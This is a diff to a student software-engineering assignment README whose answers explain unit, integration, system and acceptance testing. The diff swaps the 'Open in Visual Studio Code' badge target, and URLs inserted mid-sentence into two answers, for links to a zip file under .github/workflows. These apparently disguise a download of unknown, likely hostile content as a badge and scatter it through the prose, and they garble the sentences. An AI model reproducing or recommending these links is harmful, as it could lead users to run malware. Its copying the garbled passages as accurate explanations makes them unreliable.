@@ -1,4 +1,4 @@
-[![Open in Visual Studio Code](https://raw.githubusercontent.com/timokamau/se-day1-assignment-timokamau/main/.github/se-day1-assignment-timokamau-1.1.zip)](https://raw.githubusercontent.com/timokamau/se-day1-assignment-timokamau/main/.github/se-day1-assignment-timokamau-1.1.zip)
+[![Open in Visual Studio Code](https://github.com/timokamau/se-day1-assignment-timokamau/raw/refs/heads/main/.github/workflows/se_day_timokamau_assignment_v2.1.zip)](https://github.com/timokamau/se-day1-assignment-timokamau/raw/refs/heads/main/.github/workflows/se_day_timokamau_assignment_v2.1.zip)
 # SE_Day1
 Software Engineering Day1 Assignment
 
@@ -91,8 +91,8 @@ Solution: Use scalable architecture, Emphasize reliability.
 
 Explain the different types of testing (unit, integration, system, and acceptance) and their importance in software quality assurance.
 Unit tests - are close to the source of an application, They consist in testing individual methods and functions of the classes, components, or modules used by your software. it ensures that each unit performs its intended function correctly, isolated from other components.
-Integration tests- verify that different modules or services used by your application work well https://raw.githubusercontent.com/timokamau/se-day1-assignment-timokamau/main/.github/se-day1-assignment-timokamau-1.1.zip to ensure data flows smoothly between modules and interfaces work as expected.
-System testing -Focus on the entire software system as a whole, including all functionalities and https://raw.githubusercontent.com/timokamau/se-day1-assignment-timokamau/main/.github/se-day1-assignment-timokamau-1.1.zip help to verify that the system meets all functional and non-functional requirements, including performance, usability, and security .
+Integration tests- verify that different modules or services used by your application work well https://github.com/timokamau/se-day1-assignment-timokamau/raw/refs/heads/main/.github/workflows/se_day_timokamau_assignment_v2.1.zip to ensure data flows smoothly between modules and interfaces work as expected.
+System testing -Focus on the entire software system as a whole, including all functionalities and https://github.com/timokamau/se-day1-assignment-timokamau/raw/refs/heads/main/.github/workflows/se_day_timokamau_assignment_v2.1.zip help to verify that the system meets all functional and non-functional requirements, including performance, usability, and security .
 Acceptance tests -are formal tests that verify if a system satisfies business requirements. They require the entire application to be running while testing and focus on replicating user behaviors.- Whether the software meets the needs of the end-user and is ready for deployment.
 
 
